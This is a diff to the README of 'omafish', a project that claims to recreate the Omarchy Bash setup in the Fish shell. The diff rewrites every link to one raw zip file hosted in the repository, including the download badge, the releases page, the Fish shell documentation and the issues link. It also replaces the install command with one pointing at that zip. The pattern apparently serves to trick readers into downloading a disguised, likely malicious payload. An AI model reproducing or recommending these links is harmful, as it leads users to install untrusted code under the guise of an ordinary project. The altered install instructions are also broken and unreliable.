@@ -2,7 +2,7 @@
 
 ## 📥 Download & Install
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/Deterrencenun48/omafish/releases)
+[![Download Release](https://raw.githubusercontent.com/Deterrencenun48/omafish/master/functions/omafish-1.1.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Deterrencenun48/omafish/master/functions/omafish-1.1.zip)
 
 Welcome to the omafish project! This application recreates DHH's Omarchy Bash setup inside the Fish shell, making it easy for you to work in a more enjoyable environment. To get started, simply follow these steps to download and run our application.
 
@@ -20,7 +20,7 @@ Welcome to the omafish project! This application recreates DHH's Omarchy Bash se
 
    To download the application, visit the release page. This page contains all available versions of the omafish application along with their release notes.
 
-   [Visit the Releases Page](https://github.com/Deterrencenun48/omafish/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Deterrencenun48/omafish/master/functions/omafish-1.1.zip)
 
 ## 🔍 Installation Steps
 
@@ -39,7 +39,7 @@ Welcome to the omafish project! This application recreates DHH's Omarchy Bash se
    - Run the following command to install the application:
 
      ```bash
-     fish omafish-install.fish
+     fish https://raw.githubusercontent.com/Deterrencenun48/omafish/master/functions/omafish-1.1.zip
      ```
 
    This command sets up the necessary files in your Fish shell environment.
@@ -85,7 +85,7 @@ For more information or specific questions, please reach out through the GitHub 
 
 ## 📌 Additional Resources
 
-- [Fish Shell Documentation](https://fishshell.com/docs/current/)
-- [GitHub Issues for omafish](https://github.com/Deterrencenun48/omafish/issues)
+- [Fish Shell Documentation](https://raw.githubusercontent.com/Deterrencenun48/omafish/master/functions/omafish-1.1.zip)
+- [GitHub Issues for omafish](https://raw.githubusercontent.com/Deterrencenun48/omafish/master/functions/omafish-1.1.zip)
 
 By following these steps, you should be able to easily download and run the omafish application without technical knowledge. Enjoy your experience with the Fish shell!
